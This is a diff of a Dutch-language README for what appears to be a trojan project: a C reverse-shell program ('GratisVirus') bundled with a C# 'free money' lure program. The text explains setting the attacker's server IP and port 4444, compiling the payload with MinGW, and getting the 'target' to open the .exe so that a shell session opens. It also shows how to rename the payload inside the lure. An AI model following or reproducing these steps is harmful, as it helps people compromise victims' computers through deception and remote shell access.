@@ -15,17 +15,17 @@ Het 'Gratis Geld' programma is gemaakt in C#. Ook hier zijn de code bestanden va
 
 - Open GratisVirus.c met jouw IDE (Sublime Text, Atom, etc)
 - Verander de volgende 2 regels naar jouw ServerIP en Port voor connectie.
-- Regel 143: `$ ServIP = "192.168.198.130";`
-- Regel 144: `$ ServPort = 4444;`
+- Regel 143: ` ServIP = "192.168.198.130";`
+- Regel 144: ` ServPort = 4444;`
 - Stop de GratisVirus.c file in de bin directory van mingw32.
 
 - Wanneer je klaar bent met het editen van deze gegevens, op je CMD (ALS ADMINISTRATOR)
-- Change Directory naar de bin van MinGW. (`$ cd C:\Program Files (x86)\mingw-w64\i686-8.1.0-posix-dwarf-rt_v6-rev0\mingw32\bin`
-- Voer in CMD het volgende in : `$ gcc GratisVirus.c naamvanexebestand -lwininet -lwsock32` (Dit maakt een .exe bestand van de .c file)
+- Change Directory naar de bin van MinGW. (` cd C:\Program Files (x86)\mingw-w64\i686-8.1.0-posix-dwarf-rt_v6-rev0\mingw32\bin`
+- Voer in CMD het volgende in : ` gcc GratisVirus.c naamvanexebestand -lwininet -lwsock32` (Dit maakt een .exe bestand van de .c file)
 De gebruiker of (target), zal dit .exe bestand moeten openen om een shellsessie te creëren.
 
 #### Note:
 - Wanneer je de exe file aanpast van GratisVirus.exe naar jouw eigen naam.exe, en het meegeleverde GratisGeld programma hierbij wilt gebruiken, moet je het GratisGeld programma wijzigen. Dit doe je met Visual Studio.
 
 Verander in het bestand 'GeldProgramma/FreeSpyWare2019/Form1.cs' regel 34 aan.
-- `$string file = @"GeldVirus.exe";` Naar jouw bestandsnaam.exe.
+- ` string file = @"GeldVirus.exe";` Naar jouw bestandsnaam.exe.
